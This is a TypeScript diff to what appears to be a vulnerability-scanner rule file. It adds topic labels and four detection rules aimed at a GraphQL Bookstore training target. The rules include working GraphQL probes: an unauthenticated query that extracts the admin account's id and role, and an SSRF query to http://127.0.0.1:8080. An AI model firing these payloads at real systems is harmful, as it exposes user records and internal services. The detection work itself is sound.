@@ -32649,7 +32649,9 @@ const WEB_SECURITY_LEARNING_MODULE_TOPICS: Record<string, string> = {
   "1015": "JWT",
   "1016": "Command Injection",
   "1017": "SSRF",
-  "1018": "Prototype Pollution"
+  "1018": "Prototype Pollution",
+  "1019": "Directory Traversal",
+  "1020": "LDAP Injection"
 };
 
 /** Topic aliases when catalog chunks use alternate labels (e.g. CSRF vs Cross-Site Request Forgery). */
@@ -32658,7 +32660,9 @@ const WEB_SECURITY_LEARNING_MODULE_TOPIC_ALIASES: Record<string, RegExp> = {
   "1015": /JWT|JSON Web Token/i,
   "1016": /Command Injection|OS command injection/i,
   "1017": /SSRF|Server-Side Request Forgery/i,
-  "1018": /Prototype Pollution/i
+  "1018": /Prototype Pollution/i,
+  "1019": /Directory Traversal|Path Traversal|LFI/i,
+  "1020": /LDAP Injection|LDAP/i
 };
 
 function webSecurityLearningModuleTopicMatches(moduleId: string, topic: string, corpus: string): boolean {
@@ -51958,6 +51962,139 @@ const dvgaGraphqlSqliFilterRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+function isGraphqlBookHost(ctx: RuleContext): boolean {
+  return /graphqlbook\.org/i.test(ctx.origin);
+}
+
+function graphqlBookGqlUrl(ctx: RuleContext): string {
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (/\/graphql\b/i.test(pageUrl)) return pageUrl.split("?")[0];
+  return new URL("/graphql", ctx.origin).toString();
+}
+
+const graphqlBookInternalUserSearchBolaLiveOracle: Rule = async (ctx) => {
+  if (!isGraphqlBookHost(ctx)) return NEGATIVE;
+  const gqlUrl = graphqlBookGqlUrl(ctx);
+  const doc = await ctx.probe.get(gqlUrl, {
+    method: "POST",
+    body: JSON.stringify({
+      query: '{ _internalUserSearch(username: "admin") { id username role } }'
+    }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  let parsed: Record<string, unknown> | null = null;
+  try {
+    parsed = JSON.parse(doc.body) as Record<string, unknown>;
+  } catch {
+    return NEGATIVE;
+  }
+  const data = parsed.data;
+  if (!data || typeof data !== "object") return NEGATIVE;
+  const hits = (data as { _internalUserSearch?: unknown })._internalUserSearch;
+  const rows = Array.isArray(hits) ? hits : hits ? [hits] : [];
+  const admin = rows.find(
+    (row) =>
+      row &&
+      typeof row === "object" &&
+      String((row as { username?: unknown }).username ?? "").toLowerCase() === "admin"
+  ) as { id?: unknown; username?: unknown; role?: unknown } | undefined;
+  if (!admin?.id) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: String(admin.role ?? "").toLowerCase() === "admin" ? 0.94 : 0.92,
+    evidence: {
+      url: gqlUrl,
+      username: admin.username,
+      role: admin.role,
+      snippet: doc.body.slice(0, 220).trim(),
+      note: "GraphQL Bookstore POST /graphql { _internalUserSearch(username:\"admin\") } returns admin user id/role without authentication — GraphQL BOLA oracle"
+    }
+  };
+};
+
+const graphqlBookInternalUserSearchBolaRouteLiveOracle: Rule = async (ctx) => {
+  if (!isGraphqlBookHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/graphql\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await graphqlBookInternalUserSearchBolaLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "GraphQL Bookstore /graphql route scan — _internalUserSearch returns admin user without authentication — route-specific GraphQL BOLA oracle"
+    }
+  };
+};
+
+const graphqlBookFetchExternalResourceSsrfLiveOracle: Rule = async (ctx) => {
+  if (!isGraphqlBookHost(ctx)) return NEGATIVE;
+  const gqlUrl = graphqlBookGqlUrl(ctx);
+  const doc = await ctx.probe.get(gqlUrl, {
+    method: "POST",
+    body: JSON.stringify({
+      query: '{ _fetchExternalResource(url: "http://127.0.0.1:8080") }'
+    }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  let parsed: Record<string, unknown> | null = null;
+  try {
+    parsed = JSON.parse(doc.body) as Record<string, unknown>;
+  } catch {
+    return NEGATIVE;
+  }
+  const data = parsed.data;
+  if (!data || typeof data !== "object") return NEGATIVE;
+  const resource = (data as { _fetchExternalResource?: unknown })._fetchExternalResource;
+  if (typeof resource !== "string" || resource.length < 8) return NEGATIVE;
+  let inner: Record<string, unknown> | null = null;
+  try {
+    inner = JSON.parse(resource) as Record<string, unknown>;
+  } catch {
+    if (!/bookstore-api|internal|127\.0\.0\.1|localhost/i.test(resource)) return NEGATIVE;
+  }
+  const service =
+    inner &&
+    (String(inner.service ?? "").includes("bookstore") ||
+      String(inner.status ?? "").toLowerCase() === "ok" ||
+      /\d+d\s+\d+h/i.test(String(inner.uptime ?? "")));
+  if (!service && !/bookstore-api|internal-service|127\.0\.0\.1/i.test(resource)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: service ? 0.94 : 0.92,
+    evidence: {
+      url: gqlUrl,
+      snippet: resource.slice(0, 220).trim(),
+      note: "GraphQL Bookstore POST /graphql { _fetchExternalResource(url:\"http://127.0.0.1:8080\") } fetches internal service metadata — GraphQL SSRF oracle"
+    }
+  };
+};
+
+const graphqlBookFetchExternalResourceSsrfRouteLiveOracle: Rule = async (ctx) => {
+  if (!isGraphqlBookHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/graphql\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await graphqlBookFetchExternalResourceSsrfLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "GraphQL Bookstore /graphql route scan — _fetchExternalResource fetches attacker-controlled internal URLs — route-specific GraphQL SSRF oracle"
+    }
+  };
+};
+
 const dvgaMyPastesIdorLiveOracle: Rule = async (ctx) => {
   if (!isDvgaLiveHost(ctx)) return NEGATIVE;
   const base = dvgaCanonicalOrigin(ctx);
@@ -68715,6 +68852,10 @@ export const RULES: Record<string, Rule> = {
   dvgaGraphqlIntrospectionRouteLiveOracle,
   dvgaGraphqlSqliFilterLiveOracle,
   dvgaGraphqlSqliFilterRouteLiveOracle,
+  graphqlBookInternalUserSearchBolaLiveOracle,
+  graphqlBookInternalUserSearchBolaRouteLiveOracle,
+  graphqlBookFetchExternalResourceSsrfLiveOracle,
+  graphqlBookFetchExternalResourceSsrfRouteLiveOracle,
   dvgaMyPastesIdorLiveOracle,
   dvgaMyPastesIdorRouteLiveOracle,
   dvgaImportPasteSsrfLiveOracle,
